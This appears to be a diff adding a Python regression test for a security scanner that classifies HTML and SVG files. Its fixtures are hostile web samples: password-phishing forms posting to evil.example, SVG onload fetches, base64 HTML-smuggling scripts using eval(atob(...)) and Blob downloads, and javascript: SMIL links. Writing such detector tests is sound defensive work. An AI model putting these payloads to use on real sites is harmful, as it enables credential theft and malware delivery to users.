@@ -306,3 +306,118 @@ def test_web_pipeline_redos_linear_runtime(tmp_path: Path) -> None:
     _scan(tmp_path, "adv2.html", adv2)
     elapsed = time.perf_counter() - started
     assert elapsed < 3.0, f"Adversarial HTML took too long: {elapsed:.2f}s"
+
+
+def test_review_regressions_cdata_arrow_oversize_rfc2397_smil_and_linear_trailing_gt(
+    tmp_path: Path,
+) -> None:
+    # 1. Blocker 1: tags AFTER <script>...</script> and <style> must still be parsed!
+    after_script = (
+        b"<!DOCTYPE html><html><head><script>var ok = 1;</script><style>body{}</style></head>"
+        b'<body><form action="https://phish.example/steal"><input type="password"></form></body></html>'
+    )
+    res_after = _scan(tmp_path, "after_script.html", after_script)
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_after)
+
+    # 2. Blocker 2A: '>' inside quoted attribute value (JS arrow function =>)
+    arrow_svg = (
+        b'<svg xmlns="http://www.w3.org/2000/svg" '
+        b'onload="fetch(\'https://evil.example\').then(r => r.text())"/>'
+    )
+    res_arrow = _scan(tmp_path, "arrow.svg", arrow_svg)
+    assert "SVG_SCRIPT" in _rule_ids(res_arrow)
+
+    # 3. Blocker 2B: oversized active tag > 64 KiB fails closed (WEB_PARSE_LIMIT),
+    #    while benign oversized <path d="..."> stays GREEN 0.
+    huge_active = (
+        b'<svg xmlns="http://www.w3.org/2000/svg" data-pad="'
+        + b"A" * 70_000
+        + b'" onload="alert(1)"/>'
+    )
+    res_ha = _scan(tmp_path, "huge_active.svg", huge_active)
+    assert "WEB_PARSE_LIMIT" in _rule_ids(res_ha)
+    assert res_ha.is_incomplete
+
+    huge_path = (
+        b'<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0'
+        + b" L1 1" * 15_000
+        + b'"/></svg>'
+    )
+    res_hp = _scan(tmp_path, "huge_path.svg", huge_path)
+    assert res_hp.risk_level == RiskLevel.GREEN
+    assert res_hp.score == 0
+
+    # 4. Major 3: unclosed '<a '*60_000 WITH trailing '>' must remain strictly O(N)
+    adv_gt = b"<!DOCTYPE html>" + b"<a " * 60_000 + b">"
+    t0 = time.perf_counter()
+    _scan(tmp_path, "adv_gt.html", adv_gt)
+    assert time.perf_counter() - t0 < 2.0
+
+    # 5a. Major 4: RFC-2397 ';charset=utf-8;base64,'
+    form_b64 = base64.b64encode(
+        b'<form action="https://evil.example"><input type="password"></form>'
+    ).decode("ascii")
+    res_cs = _scan(
+        tmp_path,
+        "charset.html",
+        f'<!DOCTYPE html><iframe src="data:text/html;charset=utf-8;base64,{form_b64}"></iframe>'.encode(),
+    )
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_cs)
+
+    # 5b. Major 4: seen_prefix collision (null prefix before real ISO)
+    dummy_zeros = base64.b64encode(b"\x00" * 200).decode("ascii")
+    iso_b64 = base64.b64encode(_minimal_iso()).decode("ascii")
+    res_iso = _scan(
+        tmp_path,
+        "iso_collide.html",
+        f"<!DOCTYPE html><script>var a='{dummy_zeros}'; var b='{iso_b64}';</script>".encode(),
+    )
+    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res_iso)
+
+    # 5c. Major 4: 300 benign PNG data-URIs before atob(...) must not starve atob
+    png_b64 = base64.b64encode(_minimal_png()).decode("ascii")
+    pngs = "".join(f"<img src='data:image/png;base64,{png_b64}'>" for _ in range(300))
+    res_atob = _scan(
+        tmp_path,
+        "atob_after_pngs.html",
+        f"<!DOCTYPE html><body>{pngs}<script>document.write(atob('{form_b64}'));</script></body>".encode(),
+    )
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_atob)
+
+    # 5d. Major 4: CDATA comment inside <script> must not discard JS outside CDATA
+    cdata_mix = (
+        b'<svg xmlns="http://www.w3.org/2000/svg">'
+        b"<script>window.location='https://evil.example'; // <![CDATA[x]]></script>"
+        b"</svg>"
+    )
+    res_cd = _scan(tmp_path, "cdata_mix.svg", cdata_mix)
+    assert {"SVG_SCRIPT", "SVG_EXTERNAL_REDIRECT"} <= _rule_ids(res_cd)
+
+    # 5e. Major 4: SMIL semicolon-separated values list
+    smil_list = (
+        b'<svg xmlns="http://www.w3.org/2000/svg">'
+        b'<a id="x"><animate attributeName="href" values="https://safe.example;javascript:alert(1)"/></a>'
+        b"</svg>"
+    )
+    res_sl = _scan(tmp_path, "smil_list.svg", smil_list)
+    assert "SVG_SCRIPT" in _rule_ids(res_sl)
+
+    # 5f. Major 4: pure smuggling JS inside atob(...) without HTML tags
+    js_smug = base64.b64encode(
+        b"var b=new Blob(['x']); var u=URL.createObjectURL(b); a.download='inv.iso'; a.click();"
+    ).decode("ascii")
+    res_js = _scan(
+        tmp_path,
+        "atob_js.html",
+        f"<!DOCTYPE html><script>eval(atob('{js_smug}'));</script>".encode(),
+    )
+    assert "HTML_SMUGGLING" in _rule_ids(res_js)
+
+    # 6. Nit 5: msSaveOrOpenBlob is NOT suppressed by a benign <a download="readme.txt">
+    ms_save = (
+        b'<!DOCTYPE html><body><a download="readme.txt" href="#">Help</a>'
+        b"<script>var b=new Blob([atob('SGVsbG8=')]); navigator.msSaveOrOpenBlob(b, 'x.bin');</script>"
+        b"</body></html>"
+    )
+    res_ms = _scan(tmp_path, "mssave.html", ms_save)
+    assert "HTML_SMUGGLING" in _rule_ids(res_ms)
